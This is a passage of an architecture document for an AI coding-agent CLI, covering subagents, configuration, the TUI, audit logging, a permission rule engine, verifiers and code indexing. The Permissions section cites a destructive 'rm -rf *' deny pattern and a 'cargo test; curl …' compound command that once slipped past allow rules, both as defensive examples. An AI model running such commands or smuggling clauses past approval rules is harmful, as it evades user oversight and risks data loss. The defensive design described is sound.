`explore`/`plan` read the parent workspace unchanged. Bash CWD is not confined to the
worktree (deferred — bash keeps its existing landlock/sandbox posture). The subagent temp
dir (`kf-code-task-*`, conversation log + checkpoints) is removed by a Drop guard, so error
returns and cancellation no longer leak it. Note: the executor's spawner is threaded into the dispatch
`ToolContext` via `PreparedCall` (the parent `task` tool reaches it through `ctx.task_spawner`).
WO 38.3: worktree git ops (`create`, `diff_patch`) run via `spawn_blocking` — a hung hook
or slow NFS can no longer stall an async worker (session startup awaits `create`). `Drop`
keeps the sync call (Drop cannot await; the stale-worktree recovery path covers a crash
mid-remove).

Personas route through the same provider resolution as the main session
(config `provider`, model-name prefix heuristics, `[subagent_provider]`
override). WO 26.6 closed the Anthropic-only gap: Bedrock/Vertex-configured
users invoke personas through their configured provider without needing a
separate Anthropic API key.

**Per-subagent provider override** (WO 30.0.6 brain+brawn): the optional
`[subagent_provider]` config block (TOML) or `KF_CODE_SUBAGENT_*` env vars
let subagents run on a different model + host + API keys than the parent.
Every field is optional; an unset field inherits the parent's value, so a
partial block (e.g. `model` + `ollama_host` only) keeps the parent's API
keys. `InProcessTaskSpawner` resolves the model as `task`-tool arg →
`subagent_provider.model` → parent's `default_model`; host and per-provider
keys fall back to the parent when unset. Enables the brain+brawn split: an
expensive cloud model orchestrates while cheap brawn runs on a different
provider/account.

**Subagent model fallback**: when the primary subagent model fails on the
first turn (connection refused, 401, 404, etc.), `run_task_detailed`
retries with a fallback model before giving up. The fallback is configured
via `subagent_fallback_model` (top-level) or
`subagent_provider.fallback_model` (per-provider; wins over top-level).
`None` = no fallback (propagate the error as before). Only the first turn
gets a fallback; subsequent turns use whatever adapter is active. The
executor's `swap_adapter` method replaces the adapter at runtime.

**Dynamic agents (WO 39.3 — Claude compat phase 2)**: `.claude/agents/*.md`
files load into an `AgentRegistry` (`src/session/agents.rs`) at spawner
construction. Each file has YAML-like frontmatter (`name`, `description`,
`tools`, `model`) and a body that is the agent's system prompt. When the
`task` tool's `persona` argument matches a registered agent name, the
spawner's `_` arm (previously the full-toolset fallback) restricts the
toolset to the agent's `tools` list — translated through the
`CLAUDE_TOOL_ALIASES` table (Read→read_file, Bash→bash, Task→task, …) — and
the `task` tool prepends the agent's system prompt + a Claude alias suffix
(the model's prose references to "use Read" can't be rewritten reliably,
so the suffix maps alias→native in one paragraph). The agent's `model`
frontmatter overrides the per-call model (plumbed through `TaskRequest`).
Trust gate: the workspace `.claude/agents/` dir is model-writable in-session,
so it gets the same `plugin_trust_workspace` opt-in as workspace plugins —
`load_from_dir` refuses it unless `plugin_trust_workspace = true` or the dir
is under the canonical data directory. The `task` tool description lists
discovered agents so the model knows which persona names are valid.

**Color themes** (WO 27.6): the TUI ships a central `Theme` palette (`src/tui/theme.rs`) covering every color role the markdown renderer, search highlighter, table grid, and budget indicator use. Four built-ins: `default` (prior hard-coded colors — the back-compat baseline), `dark` (high-contrast dark), `light` (readable on white terminals — swaps `Black`/`Cyan`/`Yellow` for higher-luminance alternatives), and `monokai` (warm palette with the canonical Monokai hex values). The active theme is selected by `display.theme` (TOML) or `KF_CODE_THEME` (env), both defaulting to `"default"`, and is live-switchable via the `/theme [name]` slash command — `/theme` with no argument cycles through the four built-ins. Unknown names fall back to `default`. The render functions in `src/tui/rendering/` take a `&Theme` and read colors by role name (`code_block_fg`, `link`, `budget_tight`, …); zero `Color::*` literals remain in production code under `rendering/`. Custom user-loaded palettes are explicitly out of scope (upgrade path: a `Theme::custom(palette)` constructor reading a TOML color map).

**Mouse support** (WO 27.7): the TUI enables crossterm mouse capture at startup and routes click/drag/scroll through `events::handle_mouse_event` (`src/tui/events.rs`). The mouse wheel scrolls the chat (unchanged from before); a left-click in the chat body "grabs" the view (turns auto-follow off so it sticks where the user clicked) and a subsequent left-drag scroll-pans the chat by the row delta (natural scrolling — content follows the drag). WO 34.1 removed the top tab bar, so row 0 is now the header and a click there is a drag-grab (not a tab switch) — the command palette (Ctrl+K) and direct Ctrl-shortcuts (Ctrl+M/S/J/,/P) replace click-to-switch-tab. `DisableMouseCapture` runs in both the normal shutdown path and the panic-safe `TerminalGuard::drop`, so the terminal is never left with capture stuck on. Operators who dislike mouse capture hijacking their scrollback wheel can disable all of it with `display.mouse_enabled = false` (TOML) or `KF_CODE_MOUSE_ENABLED=false` (env) — when false, `EnableMouseCapture` is skipped entirely so the terminal keeps native scrollback. Click-to-position the text cursor inside the prompt input is deferred to 27.7-R2-later (the `LineReader` does not expose a set-position API cleanly); panel focus + drag-scroll alone close the competitive gap.

**Panic containment + terminal survival** (WO 38.2): the release profile uses `panic = "abort"`, so `TerminalGuard::drop` never runs on a panic — the user's terminal is left in raw/alt-screen. `install_panic_hook` (`src/tui/mod.rs`, `Once`-guarded) is installed BEFORE `enable_raw_mode()` in all three TUI entry points (`run_tui`, `run_session_picker_sync`, `run_replay_tui`); the hook calls `disable_raw_mode()` + `force_terminal_reset()` FIRST, then chains to the previous hook so the panic message lands on a clean cooked-mode screen. The session picker clamp panic (heights 8-11, `MIN_HEIGHT=8` vs `.clamp(12, h)`) is fixed via a pure `picker_dialog_area` helper with `MIN_HEIGHT=12` + safe `.min().max()` ordering, mirroring `approval_dialog_area`. Poison-tolerant locks (`unwrap_or_else(|e| e.into_inner())`) replaced `.unwrap()`/`.expect("poisoned")` on turn-critical paths: `event_bus.rs` (12 sites), `kf-lsp/src/lib.rs` shutdown/Drop (6 sites), `computer_use.rs` (3 sites), `notebook_edit.rs` (match pattern). `short_ts` is char-boundary-safe via `is_char_boundary` checks before byte-slicing.

**Command palette + overlay architecture** (WO 34.1): the persistent F1–F6 tab bar is gone. The top of the screen is a one-line header (`render_header` in `src/tui/widgets/tabs.rs`): app name + current model + a ready/busy indicator. `ActiveTab` gains a `None` variant (the default — chat-only mode, no overlay). Chat is the permanent primary surface; the former tabs (Models/Plugins/Jobs/Settings/Threads) are overlays summoned three ways: the command palette (Ctrl+K — a centered popup with a search input + fuzzy-filtered action list, `src/tui/widgets/command_palette.rs`), direct Ctrl-shortcuts (Ctrl+M→Models, Ctrl+S→Sessions, Ctrl+J→Jobs, Ctrl+,→Settings, Ctrl+P→Plugins), and F-keys as an invisible muscle-memory fallback. Esc clears any active overlay back to `ActiveTab::None`. The palette actions cover the 5 overlay tabs plus slash-command actions (Compact/Help/Test/Commit/Undo/Clear), a Search-conversation action (enters Ctrl+F search mode), and Change-model (Models overlay). Overlays currently render in the main content area (replacing the chat view, matching pre-34.1 behavior); true overlay-on-top-of-chat rendering is the WO 34.1 step-5 goal and is deferred (see the `ponytail:` comment in `render_app`).

### `shared/` — cross-cutting types

`Config` (decomposed into 5 `#[serde(flatten)]` sub-structs: `ModelConfig`,
`SecurityConfig`, `ToolConfig`, `SessionConfig`, `DisplayConfig`), `Message`,
`Role`, `StreamEvent`, `ToolDef`, `ToolOutcome`, `ModelInfo`, `ContentPart`,
metrics, backoff, permissions, minify (see
[Prompt-time minification](#prompt-time-minification) below), audit,
event_bus. The `emit!` / `send_or_warn!` macros (`shared/mod.rs`, WO 47.10)
are the convention that replaces `let _ = tx.send(...)`: a dropped receiver
logs a warning instead of silently swallowing the event. The audit log records
destructive tool calls (`AuditEntry::Tool`) and hook denials / fail-open
failures (`AuditEntry::Hook`, WO 11.6 / ADR-061) as append-only NDJSON
with a `"kind"` tag. WO 29.4 added the tamper-evident hash-chained audit
trail alongside the existing log: `AuditEvent` (29-literal `AuditAction`
+ `AuditOutcome`), `initial_hash`/`chain_hash_of` (SHA-256, or HMAC-SHA256
when keyed via `KIRKFORGE_AUDIT_KEY`), `MemoryAuditSink`, `FileAuditSink`
(size-based rotation, default 50 MB / 10 files), `AuditLogger`, and a
`create_audit_sink` factory for `{memory, file}`. WO 42.2: `FileAuditSink::new`
resumes `last_hash` from the last on-disk event so the chain continues across
restarts, and `verify_chain` replays the file to detect tampering;
`create_audit_sink` calls it on construction and warns on a broken chain. WO
43.21: `AuditLog::write_entry` flushes + `sync_data` per entry (survives
SIGKILL / panic-abort), and `FileAuditSink` truncates a torn final line on
`new` (torn tail ≠ tamper), has `impl Drop` → flush, and `verify_chain`
skips an unparseable final line. The `event_bus` module
ports `@kirkforge/core-events`'s `EventBus`: async `emit` with idempotency
cache (TTL + size cap) and bounded buffer, `on` returning an unsub
callable, `drain_buffer`, `shutdown`, and `graceful_shutdown`. Dead sinks
(http/syslog/worm) are deliberately not ported — zero production consumers.
kf-orchestrator's `EventSink` bridges onto this bus via
`session::event_sink_bridge::EventBusSink` (WO 36.6): the bus `Event` shape
accepted the artifact events cheaply (kind/stream_id/timestamp/value carry
over, `task_id` folds into the value, per-sink sequence keeps the
idempotency key unique), so no TracingSink fallback was needed. Emit
failures (bus shut down) log a warning — the bridge exists so artifact
events are not silently swallowed. The `Event.kind` field is typed
(`BusEventKind`): the four production `artifact.*` kinds are named
variants, any other TS-shape kind flows through `BusEventKind::Other`
(WO 45.10 — closes the one untyped event surface; `as_str()` preserves
the TS wire shape for the `artifact.*` bridge).

**Config surface count:** the `Config` tree exposes **109 struct fields**
across the 5 sub-structs (`CONFIG_FIELD_COUNT` at `src/shared/config/mod.rs`,
bumped 108 → 109 by WO 48.34). Since WO 47.2 every field is env-overridable
by prefix rule (`KF_CODE_<FIELD>` → field, value coerced via the serialized
type guide), with irregular names in `KEY_MAP`
(`src/session/config/env_overrides.rs`) and 3 validated post-block vars —
the enumerated env-var inventory the old count described no longer exists.
The count is enforced by `config_field_count_drift_guard`
(`src/session/config/mod.rs`), which asserts the `CONFIG_FIELD_COUNT`
const, `KEY_MAP` path integrity, that every env-var literal in the loader
is accounted for, and that the const matches the serde-serialized field
count. Adding a config field without updating the const fails the test.

`ToolConfig.max_continuation_rounds` (default 20, clamped 0–50) caps how many
times the turn loop will continue after `FinishReason::Length`. When the cap
is hit, the turn ends with a clear error message. Set to 0 to disable
continuation entirely (treat `Length` as `Stop`). Each continuation round
emits `TurnEvent::ContinuationRound { round, max }`, which the TUI surfaces
as "⟳ round/max" in the status bar (WO 23.9-R3). Env override:
`KF_CODE_MAX_CONTINUATION_ROUNDS`.

`ToolConfig.max_background_tasks` (default 4, clamped 1–64) controls the
semaphore size for `task(background=true)`. Only N background tasks run
concurrently; additional tasks either queue or are rejected depending on
`task_concurrency_mode`. Env override: `KF_CODE_MAX_BACKGROUND_TASKS`.

`ToolConfig.task_concurrency_mode` (default `"queue"`, values `"queue"` or
`"reject"`) controls backpressure when `max_background_tasks` is reached. In
`"queue"` mode, excess tasks wait for a permit (current behavior). In
`"reject"` mode, excess tasks immediately return a `Failure` outcome with a
message suggesting `task_output` or increasing `max_background_tasks`. Env
override: `KF_CODE_TASK_CONCURRENCY_MODE`.

`ToolConfig.max_subagent_turns` (default 32, clamped 1–1024) is the ceiling
the `task` tool applies to the model-supplied `max_turns` argument (WO 48.34)
— a runaway value cannot reach the subagent executor loop. Env override:
`KF_CODE_MAX_SUBAGENT_TURNS`.

Each background task is tracked with a derived `TaskStatus`
(`Pending | Running | Completed | Cancelled | Failed | TimedOut`) plus
`TaskMetadata` (model, persona, ≤100-char prompt summary, started_at,
duration_ms, token_estimate, parent_task_id). `TaskManager::cancel` (WO 35.3)
is cooperative: it sets the per-task flag, cancels the task's
`CancellationToken`, and the worker *awaits* `run_task` to completion — no
future-dropping. The subagent turn loop observes the flag between steps
(exiting early with its partial summary + worktree patch), in-flight tool
calls observe the token (a running bash's process group is killed in
milliseconds, not at `tool_timeout_secs` — the subagent executor's per-call
tokens are live children of the root token via `Executor::set_cancel_token`),
and `run_task`'s own cleanup runs (temp-dir Drop guard, patch capture).
An in-flight model stream is aborted mid-request: the turn loop races each
next-event await against the attached root cancel token (WO 36.3) and drops
the stream receiver on cancel, so a stalled provider stream ends the turn at
cancel time (partial content flushed) instead of at the next event or the
adapter's `request_timeout_secs`.
Cancelled tasks keep status `Cancelled` but retain partial output in
`TaskHandle.cancelled_result`, surfaced by `task_output`. `TaskManager::cancel`
also kills the background bash jobs the subagent spawned (WO 36.2): the
`task`/orchestrator request carries the task id as `TaskRequest.owner`, the
subagent `Executor` threads it into every `ToolContext.task_owner`, and
`bash background=true` tags the registry job with it — cancel fires
`BashJobRegistry::cancel_by_owner(task_id)`, which kills each owned job's
process group the same way `bash_cancel` does (status flipped to `Cancelled`
before the kill so the watcher preserves it; when the watcher is parked on
the child mutex the group is killed by pid instead of waiting on the lock).
Main-session jobs (owner `None`) and other tasks' jobs are never touched.
In-flight model streams abort promptly on cancel (WO 36.3): the stream
iteration races its next-event await against the live cancel token and, when
it fires, drops the stream future (aborting the request) and takes the
cooperative cancelled path. The parent session gets the same prompt
cancellation (WO 36.4): `Executor::run` installs a fresh per-turn live token
at each input (tokens are one-shot), the TUI's Esc cancel watcher fires the
flag and the token together, and per-tool child tokens derive from it (tool
timeouts stay independently triggerable while parent cancel cascades).
Task ids are minted from a process-global atomic counter shared by every
`TaskManager` (WO 37.1), so owner tags are unique across managers — the
old per-manager-counter ceiling (two managers minting the same `task-N`
tag, a cancel reaching both) is resolved. Same WO: `BashJobRegistry::
remove()` kills a still-running child by pid on mutex contention instead
of parking behind the watcher, and a failed spawn leaves no registry
entry (the record is inserted only after `proc.spawn()` succeeds).
`status` and `list` expose the state for
the `/jobs` view (WO 30.2).

**Durable subagent summaries (WO 41.5 Phase 1):** on terminal state
(Completed/Failed/Cancelled), the worker closure serializes a
`PersistedTask` (id, status label, summary, model, persona,
prompt_summary, started_at, duration_ms, parent_task_id) to
`<data_dir>/tasks/<id>.json` — right before `notify.notify_waiters()`.
`load_persisted_tasks()` reads all `tasks/*.json` sorted by numeric id,
skipping malformed files. The `/tasks` slash command surfaces this
read-only history (id, status, persona, duration, truncated summary).
Phase 2 (`/jobs` integration + transcript links) and Phase 3 (full
`AgentRun` object) are deferred — tracked in WO 41.5.

### Prompt-time minification

`src/shared/minify/` (`mod`/`lang`/`expand`) is the prompt-time source
minifier (ADR-053): `read_file` auto-minifies any file above
`minify_above_bytes` (default 4096) — comments stripped, blank lines
collapsed, ~30-50% token savings on source — and wraps the result in a
`<minified lang="...">` envelope when `minify_write_side` is on, so
`write_file`/`edit_file` expand it back to readable source before writing
(`expand.rs` uses rustfmt/prettier/deno when installed, with a
punctuation-aware fallback reflow). Two engines:

- **AST path** (`minify_with_map`): tree-sitter parse with byte-position
  maps, so envelope edits land surgically at the original offsets
  (WO 17.4). Languages: Rust, Go, Python, TS/TSX, JS/JSX, Bash/Sh/Zsh
  (the `Lang` enum in the minifier, distinct from the context-index
  language set).
- **Char-scan path** (`minify_content_by_ext`, what `minify_source`
  uses): per-extension scanners covering rs, py, js/jsx/ts/tsx, go,
  c/h/cpp/hpp/cc, java, rb, sh/bash/zsh, md. Hardened across
  WO 48.1/48.11/48.12/48.13/48.25/48.26/48.29: string-literal-aware
  comment stripping (a `#`/`//` inside a string is data), JS
  regex-literal awareness (`prev_opens_regex`, line-bail on misdetect),
  and Ruby/Shell heredoc body preservation (`<<~ID`/`<<-ID`/`<<ID`,
  quoted delimiters, same-line openers).

A (path, mtime)-keyed 200-entry LRU VFS cache (`VFS_CACHE`) memoizes
plain minification; the `preserve_tests` variant (`minify_source_safe`,
used for top-file context the model has already seen) bypasses the cache
in both directions so test-stripped output is never served for a
safe-mode read (WO 48.8).

### Permissions

The permission engine (`src/shared/permission.rs`, ADR-004 amended) is the
primary approval gate for every tool call. It replaces the binary
`auto_approve: bool` and the ReadOnly/Destructive tier model with an ordered,
first-match-wins rule list. A rule has four fields:

| Field | Meaning |
|-------|---------|
| `tool` | Exact tool name (`"bash"`, `"edit_file"`, `"write_file"`, …) or `"*"` for every tool |
| `key` | Which argument to match: `"command"` for `bash`, `"path"` for file tools, or `"*"` to match without inspecting args |
| `pattern` | Glob. `*` = zero-or-more chars in one path segment (does NOT cross `/`); `**` = any chars including `/`; `?` = exactly one non-`/` char; plain strings match exactly |
| `action` | `allow` (skip approval), `ask` (show the approval dialog), `deny` (refuse without showing the dialog) |

Rules are evaluated in declaration order; the **first match wins**. When no
rule matches, the default is `Ask` (unless `auto_approve = true`, in which case
`Allow` — preserving backwards compatibility with the old boolean). The TUI's
`[A]lways` key in the approval dialog writes a `permission_rules` entry
matching the current tool call instead of flipping the global flag; the rule
persists in `~/.local/share/kf-code/config.toml` and survives across sessions.
`/permissions list | revoke <i> | clear` (WO 14.5) manages them at runtime.

**Glob semantics:** for `bash` `command` rules with `action = "deny"`, lone
`*` is automatically promoted to `**` so a deny pattern like `rm -rf *` also
blocks absolute paths across `/`. Allow/Ask rules use the literal pattern (no
promotion) — write explicit `**` when you intend a cross-slash match.

**Compound-clause evaluation (WO 38.1):** bash `command` rules are evaluated
per compound clause (`;`/`&&`/`||`/`|`/newline). An Allow/Ask rule matches
only when **every** clause matches (a `cargo test*` rule no longer authorizes
`cargo test; curl …`), and a Deny rule trips when **any** clause matches (a
deny still fires when the payload hides after a newline).

**Env-secret scrubbing (WO 38.1):** the bash runner scrubs credential-shaped
env vars (`*_API_KEY`/`*_TOKEN`/`*_SECRET`, case-insensitive) from every child
shell env. The `!` passthrough and `/test` share this runner and are scrubbed
too.

See `config.toml.example` for concrete rule examples and
`src/shared/permission.rs` (module doc comment) for the full engine
description. ADR-004 records the tier model as the historical default that the
rule engine supersedes.

### `daemon/`, `jobs/`, `line_mode/`, `main/`

Session daemon (background process tracking recent sessions), scheduled-job
daemon (cron-style, Unix-only), non-interactive line mode, and the binary entry
point.

**Daemon is opt-in (WO 47.12):** clients (`--attach`, `--auto-resume`, the
TUI startup picker, `/fork` resume) only auto-start the session daemon when
`KF_CODE_DAEMON_AUTOSTART=1` (or `true`) is set; the default is off and `kf-code`
never spawns a background process on its own. When no daemon is reachable,
the client helpers fall back to the on-disk session index
(`session_index::list_sessions` / `resolve_session_id`) — the same
newest-first data the daemon itself serves, so the flags keep working
unchanged. Explicit `kf-code daemon` (or the bundled systemd/launchd units)
always starts it, and every client uses a running daemon when one is there
(including TUI instance-channel push events). `try_touch` and
`try_notify_jobs_changed` never auto-started and are unchanged.

**RBAC permission tiers (WO 43.6):** the daemon maps its bearer token to a
`kf_rbac::Actor` with a role read from `KF_CODE_DAEMON_ROLE` (fallback
`admin`). After the existing constant-time `check_auth` token gate, each
request op is checked against `kf_rbac::has_permission`:

| Op | Permission |
|----|-----------|
| `Shutdown`, `QuitAll` | `OperatorRestart` |
| `List`, `Resolve`, `Touch`, `Claim` | `ViewerResults` |
| `Ping`, `NotifyJobsChanged`, `InstanceRegister` | `ViewerStatus` |

Admin satisfies all tiers. Single-token deployments (no `KF_CODE_DAEMON_ROLE`
set) keep today's all-access behavior via the admin fallback. Setting
`KF_CODE_DAEMON_ROLE=viewer` produces a read-only token that can list/resolve
but cannot shut down the daemon.

**CLI first-run + scriptability (WO 38.10):**

- *Exit codes* (stable, pinned by `KirkForgeError` in `src/main/error.rs`):
  0 success, 1 general, 2 bad args (clap), 3 model unreachable, 4
  permission/sandbox denied, 5 config parse error. The dispatcher
  (`cli_dispatch::main`) classifies the `anyhow::Error` from each subcommand
  via `KirkForgeError::from` (typed downcasts first, then string probes) and
  prints `kf-code: {e}` + a category hint on stderr before `exit(code)`.
- *First-run banner → stderr*: `load_or_create_config` prints the onboarding
  banner to stderr, so `--output stream-json` on a fresh data dir keeps
  stdout byte-clean (every stdout line parses as JSON).
- *Empty-model guard*: `run_session` bails with `ModelUnreachable` (exit 3)
  before the adapter is built when `default_model` is empty and no `-m` is
  given — previously fell through to an OpenAI-compat fallback and surfaced
  a raw 400.
- *`-p`/`--prompt` one-shot*: `Command::Run` takes an optional prompt that
  `LineReader::prime` queues as the first turn before the stdin loop. A `-p`
  value is a single turn even with internal blank lines (the heredoc
  terminator that ends piped stdin on a blank line does not split the arg
  form). Setting `-p` forces line mode (no TUI) so the one-shot runs
  unattended.
- *TUI degradation*: `use_tui` is true only when stdout is a TTY, not
  `--no-tui`/`--non-interactive`/`-p`, and `TERM != "dumb"`. `NO_COLOR` is
  decoupled from this decision — it suppresses colour/emoji in rendering
  (`line_mode::symbol`, etc.) but no longer forces line mode.
- *Strict config load*: `load_or_create_config_strict()` (used by `run` and
  `bench run`) returns `Err` on a hard TOML parse failure in an existing
  config.toml → exit 5; the lenient `load_or_create_config()` (plugin,
  legacy callers) keeps the warn+defaults behaviour. Unknown-key soft-merge
  warnings are never errors.
- *Bench exit code*: `bench run` bails non-zero when tasks ran and none
  passed (0% success), after writing the report — previously exited 0
  unconditionally.
- *Metrics data dir*: `shared::metrics::metrics_path()` honors
  `KF_CODE_DATA_DIR` (mirroring `session::data_dir()`) so `kf-code
  metrics`/`verify` read the same installation `run` writes to.

---

## Verification

Verification is first-class. Two coexisting verifier designs serve different
needs (unification in progress per WO 47.14 — `BusVerifier` is the
designated survivor; consumers of the event-driven `Verifier` trait migrate
one at a time):

### Event-driven `Verifier` trait

```rust
#[async_trait]
pub trait Verifier: Send + Sync {
    fn name(&self) -> &str;
    fn priority(&self) -> u8;  // lower = higher priority
    async fn verify(&self, event: &BusEvent) -> Verdict;
}
```

`Verdict` is `Clean`, `Fixable(FixSuggestion)`, `Unfixable(VerificationError)`,
or `Skipped`. Built-in verifiers: `build` (cargo build on edited files),
`lint` (clippy), `rustfmt`, `test` (targeted tests for edited files), `git`
(git-state validation), `security` (dangerous-pattern scan). WO 31.1+31.4 added Python self-gating verifiers —
`python_test` (pytest), `python_lint` (ruff/flake8), `python_typecheck` (mypy,
fires only when configured) — alongside the Rust ones. WO 32.20 added
Node/Go/Generic verifiers following the same pattern: `node_test` (npm test /
vitest), `node_lint` (eslint / tsc --noEmit), `go_test` (go test), `go_vet`
(go vet), `generic_test` (make test / ctest / ./test.sh). `detect.rs` exposes
`detect_project_languages(&Path) -> Vec<ProjectLanguage>` (sniffs `Cargo.toml`
/ `pyproject.toml`|`setup.py`|`conftest.py` / `package.json` / `go.mod`) and
each non-Rust verifier self-gates on language-marker detection at the edited
file's project root, so registering all language verifiers is safe for
pure-Rust workspaces. Missing tools (no pytest/ruff/mypy/npm/go on PATH) skip
gracefully rather than blocking the turn.

WO 33.14 phase 3 injected a `CommandRunner` trait
(`src/session/verifier/types.rs`) abstracting `cargo`/`clippy` subprocess
execution. Production uses `SystemCommandRunner` (wraps
`std::process::Command`); tests inject a hand-rolled `FakeRunner` returning
canned cargo JSON. `verify_build`/`verify_lint`/`verify_test` take
`&dyn CommandRunner`, so the full event → cargo_root → spawn → parse → Verdict
orchestration path runs in-process against the fake. One real-Cargo/Clippy
integration test per verifier is kept `#[ignore]`d with an `integration:`
reason naming the nextest profile.

### Context-based `BusVerifier` trait (ADR-043)

A sync, context-based bus that unifies findings from multiple sources
(`Build`, `Test`, `Lint`, `Rustfmt`, `Git`, `Security`, `Plugin`) behind a
single `VerifierBus`. The executor queries the bus after file-modifying tool
calls and injects error verdicts into the conversation.

ADR-028 (Accepted, Workorder 7.7 + 9.6 + 10.8): plugin-declared
`Capability::Verifier` entries register into the same `VerifierBus` via
`VerifierBus::add_plugin_verifier` / `register_plugin_verifiers_into_bus`.
Each plugin verifier runs through the host crate's env-cleared
`PluginVerifier` subprocess (exit 0 = pass, non-zero = fail with stderr) and
is tagged `VerifierSource::Plugin(name)`. The executor's
`emit_tool_event_and_correct` converts each `Severity::Error` verdict into a
`CorrectionResult`, so a single correction path handles built-in and plugin
verdicts. WO 47.14 retired the legacy event-driven `PluginVerifierAdapter`
(it dual-registered every plugin verifier into `VerifierSlots`, so each ran
twice per file-modifying tool call): the bus is the sole plugin-verifier
integration path, and plugin verifiers see `KF_CHANGED_FILES` (not the
adapter's retired `KF_EVENT_KIND`/`KF_EVENT_JSON`) and run only after
file-modifying tool calls. The cross-language NDJSON wire bridge from WO
10.8 (a Node `bridge-emitter.ts` subprocess) is **retired as of WO 29.2**:
the 14 regex security rules now live in Rust
(`src/session/verifier/security_emitter.rs`) and the
`TsOrchestratorBridgeVerifier` is a thin `BusVerifier` wrapper that calls
`security_emitter::emit_security_findings(&changed_files)` directly — no
subprocess, no NDJSON round-trip. This was the last Rust→TS call path. In
production the `VerifierBus` starts empty and holds only what the executor
explicitly registers: plugin verifiers via `register_plugin_verifiers_into_bus`.
The `TsOrchestratorBridgeVerifier` wrapper currently has no production
registration site (bus.rs defines + tests it); it is the intended landing
spot when the built-in verifiers migrate onto the bus (WO 47.14 remaining
work).

The `kf-orchestrator` crate (library, cannot depend on the binary) has its
own crate-local verify cycle (WO 32.19 R7): `run_correction_loop` scans the
delegation's written files via `kf_orchestrator::verifier::scan_files` (a
port of the same 14 regex rules) and populates
`packet.verification.security` before `decide_correction` runs. The two
copies (binary `security_emitter.rs` + crate `verifier.rs`) are
deliberate: unifying them requires extracting a `kf-security` crate, which
is out of scope for R7 (wiring, not restructuring).

### Correction loop

After a tool execution event, the correction loop (up to 3 iterations):
1. Runs verifiers → gets a `Verdict`. Verifiers run concurrently (bounded,
   4 at a time, WO 47.26); the aggregate picks the most severe finding —
   `Unfixable` over `Fixable`, first in priority order among equals.
2. `Clean`/`Skipped` → done.
3. `Fixable` with a `command` → run the formatter command in-place (e.g.
   rustfmt). `Fixable` with `original`/`replacement` → return the suggestion to
   the model as a tool result.
4. `Unfixable` → report to the model.
5. Re-verify after each auto-fix to catch cascading issues.

WO 42.11 adds a verdict cache to `VerifierHandler::verify_event`: verdicts for
`FileWrite` events with `content_hash > 0` are cached keyed by
`(file_path, content_hash)`. Only `Clean`/`Skipped` verdicts are cached —
`Fixable`/`Unfixable` are not, because the correction loop re-verifies after
applying a fix (disk content changed). After a fix is applied, the loop calls
`invalidate_cache(path)` to drop the stale entry. This skips redundant
`cargo build`/`clippy`/`test` runs for unchanged file content across turns.
Bounded at 256 entries with FIFO eviction (WO 47.26).

WO 38.3 bounds every subprocess wait in this path. The formatter
(`apply_command_fix`) gets the hooks treatment — `kill_on_drop`, null stdin,
own process group, 5s `tokio::time::timeout` with group kill — so a hung
formatter cannot stall the turn (this wait sits outside the per-tool timeout).
The plugin verifier (`kf-plugin-host::PluginVerifier::run`, invoked under the
verifier-bus mutex on every file write) gets a watchdog thread that kills its
process group after 5s and fails closed (`VerifierError::TimedOut`); a hung
verifier script can no longer hold the bus lock.

### Capability discovery + PASS coverage scope (WO 41.4)

A forward-looking capability map (`verifier_capabilities()` in
`src/session/verifier/bus.rs`) lists each verifier category with its status:
`active` (has a producer — `security`, via the Rust regex emitter WO 29.2),
`stub` (emitter not ported — `lint`, `types`, `graph`), or `external`
(delegates to a not-yet-ported subsystem — `verify-workspace`, reducer pending).
The static set mirrors the honest stub disclosure already printed by
`plugin_verify` (`native.rs` `render_verify`). The `/verify-capabilities`
slash command surfaces `verifier_capability_report()` so the user can see at a
glance what contributes to a verdict without reading source.

The pipeline summary (`PipelineResult::summary`) distinguishes `PASS` from
`PASS (security-only coverage)`: a completed (non-aborted) run's
`verdict_label` is set to `"PASS (security-only coverage)"` and rendered as a
`Verdict:` line, mirroring `plugin_verify`. Aborted runs reach no verdict and
carry no label. The pipeline does not run the reducer; the label is the honest
default until lint/types/graph emitters ship.

---

## Context index

`kf-context-index` builds a tree-sitter-backed symbol, import, and
call-graph index. For a given symbol, the agent can retrieve:

- The symbol's definition (file, line, kind)
- Files that import it (`imported_by`)
- Call sites that invoke it (`called_by`)

Four languages: Rust, TypeScript (including tsx), Python, Go. The index is
cached as JSON at `.kf-code/context-index/cache.json`, keyed on git HEAD for
invalidation and stamped with a `format_version` (WO 43.21) so a format
change invalidates old caches. The cache is written atomically (temp + rename)
so a crash mid-write cannot leave it truncated. This gives the agent
graph-grounded context instead of relying on plain-text search.

The index is built synchronously at session startup for interactive (TUI) runs.
`--non-interactive` skips the build: the tree-sitter walk is unbounded on large
working trees (gap #27) and scripted single-shot runs prioritize startup
latency over symbol enrichment.

Retrieval is hybrid (ADR-037 Phase 7): an exact symbol-name match triggers a
BFS graph walk over the import + call-graph edges (both directions, deduped by
`(file, name)` keeping the minimum hop, capped at 2 hops); a free-text query is
ranked by TF-IDF embedding cosine similarity (pure-Rust sparse vectors over
name + kind tokens, persisted in `CachedIndex`); a substring query falls back to
the original `retrieve()`. The prompt builder calls `retrieve_hybrid` every
turn. Zero new dependencies — the embeddings module is pure Rust over the
existing `serde` / `tree-sitter` / `walkdir` set. WO 38.9 item 5: the query
path now uses pre-computed embeddings from `CachedIndex` (loaded via
`ContextIndex::from_cached`) instead of rebuilding the vocabulary and
re-embedding all symbols per query.

The walker also handles five non-trivial syntax patterns (WO 8.9):

- **TypeScript** `export const foo = () => {}` — arrow function assignments
  extract the LHS identifier as a Function symbol name.
- **TypeScript interface merging** — multiple `interface Foo {}` declarations
  in the same file dedupe to one entry via `ContextIndex::dedup_interfaces()`,
  keyed by `(name, file)`.
- **Python** `if __name__ == "__main__":` — the body of the guard is skipped
  entirely so no spurious module-level symbols are produced.
- **Python decorators** — `@decorator\ndef f(): ...` extracts `f` (the
  decorated child is recursed; the decorator nodes are not).
- **Go method receivers** — `func (s *Server) Start()` and
  `func (r Server) Stop()` are both extracted as `Server.Start` / `Server.Stop`
  (pointer and value receivers are normalized to the base type).

---

## Context compression (Stratum)

Stratum is the **input-side** context cost system. It classifies tool outputs
by content type and compacts bloated payloads *before* they enter the context
window. Four modes: `off`, `lite`, `full`, `ultra`. The pipeline classifies
content and applies size-based truncation with optional offload storage.

// ponytail: MinifyTransform registered (source code minification);
// query-based relevance filtering and additional content-type transforms
// still deferred.
// Upgrade path: query-based relevance scoring, per-content-type stages.

 Stratum ships as a compiled-in module (when the `stratum` feature is on,
 ADR-046); feature-off registers no Stratum tools or hooks (no shell fallback
 exists — the former shell-plugin tree was deleted in WO 29.9).
 The `session-start` hook emits the active ruleset so the model knows the
 compression contract; the `pre-tool-bash` hook validates config to surface
